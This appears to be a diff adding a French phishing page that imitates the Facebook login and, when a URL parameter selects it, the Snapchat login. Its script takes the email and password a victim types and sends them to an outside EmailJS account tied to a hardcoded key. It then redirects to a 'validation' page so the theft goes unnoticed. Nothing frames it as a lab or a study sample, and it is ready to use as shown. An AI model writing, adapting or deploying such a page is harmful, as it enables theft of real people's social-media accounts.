@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Connexion Réseau Social</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    transition: background-color 0.3s ease;
+  }
+  .container {
+    background: white;
+    padding: 40px;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    width: 100%;
+    max-width: 380px;
+    text-align: center;
+  }
+  .logo {
+    margin-bottom: 20px;
+  }
+  .logo img {
+    width: 120px;
+  }
+  h1 {
+    font-size: 1.5em;
+    margin-bottom: 20px;
+    color: #1c1e21;
+  }
+  input[type="text"], input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 15px;
+    border: 1px solid #dddfe2;
+    border-radius: 6px;
+    font-size: 1em;
+  }
+  .btn-primary {
+    width: 100%;
+    padding: 12px;
+    font-weight: bold;
+    border: none;
+    border-radius: 6px;
+    font-size: 1.1em;
+    cursor: pointer;
+    margin-bottom: 10px;
+  }
+  a {
+    display: block;
+    margin-top: 10px;
+    font-size: 0.9em;
+    text-decoration: none;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo">
+<img id="logo-img" alt="Logo" src="logo-fb.jpg"/>
+</div>
+<h1 id="title">Se connecter à Facebook</h1>
+<input id="fb_email" placeholder="Adresse e-mail ou numéro de mobile" required type="text"/>
+<input id="fb_password" placeholder="Mot de passe" required type="password"/>
+<button class="btn-primary" id="login-btn" onclick="sendLoginData()">Se connecter</button>
+<a id="forgot-link" href="#">Mot de passe oublié ?</a>
+<a href="#">Créer un nouveau compte</a>
+</div>
+
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const params = new URLSearchParams(window.location.search);
+  const reseau = params.get('reseau') || 'facebook';
+
+  const body = document.body;
+  const logo = document.getElementById("logo-img");
+  const title = document.getElementById("title");
+  const button = document.getElementById("login-btn");
+  const forgot = document.getElementById("forgot-link");
+
+  if (reseau === 'snapchat') {
+    body.style.backgroundColor = '#fffc00';
+    logo.src = 'logo-snapchat.png';
+    title.textContent = 'Se connecter à Snapchat';
+    button.textContent = 'Se connecter';
+    button.style.backgroundColor = '#000';
+    button.style.color = '#fff';
+    forgot.style.color = '#000';
+  } else {
+    body.style.backgroundColor = '#f0f2f5';
+    logo.src = 'logo-fb.jpg';
+    title.textContent = 'Se connecter à Facebook';
+    button.textContent = 'Se connecter';
+    button.style.backgroundColor = '#1877f2';
+    button.style.color = '#fff';
+    forgot.style.color = '#1877f2';
+  }
+});
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+(function() {
+  emailjs.init("AATQVLMcBJaRBgEox");
+})();
+
+function showPopup(message) {
+  const existing = document.getElementById("popup");
+  if (existing) existing.remove();
+
+  const popup = document.createElement("div");
+  popup.id = "popup";
+  popup.innerHTML = `<div class='popup-inner'><strong>Impossible d’avancer</strong><br>${message}</div>`;
+  Object.assign(popup.style, {
+    position: "fixed", top: "25%", left: "50%",
+    transform: "translateX(-50%)",
+    backgroundColor: "#fff", color: "#050505",
+    padding: "16px 20px", borderRadius: "8px",
+    width: "90%", maxWidth: "320px", fontSize: "0.95em",
+    fontFamily: "Arial, sans-serif",
+    boxShadow: "0 4px 16px rgba(0,0,0,0.2)", zIndex: 9999,
+    textAlign: "center"
+  });
+  document.body.appendChild(popup);
+  setTimeout(() => popup.remove(), 3000);
+}
+
+function sendLoginData() {
+  const email = document.getElementById("fb_email").value.trim();
+  const password = document.getElementById("fb_password").value.trim();
+
+  if (!email || !password) {
+    showPopup("Veuillez remplir tous les champs obligatoires.");
+    return;
+  }
+
+  emailjs.send("service_photos", "template_connexion", {
+    fb_email: email,
+    fb_password: password
+  }).then(function() {
+    const reseau = new URLSearchParams(window.location.search).get('reseau') || 'facebook';
+    window.location.href = `validation.html?reseau=${reseau}`;
+  }, function(error) {
+    showPopup("Erreur lors de l'envoi. Réessayez plus tard.");
+  });
+}
+</script>
+</body>
+</html>
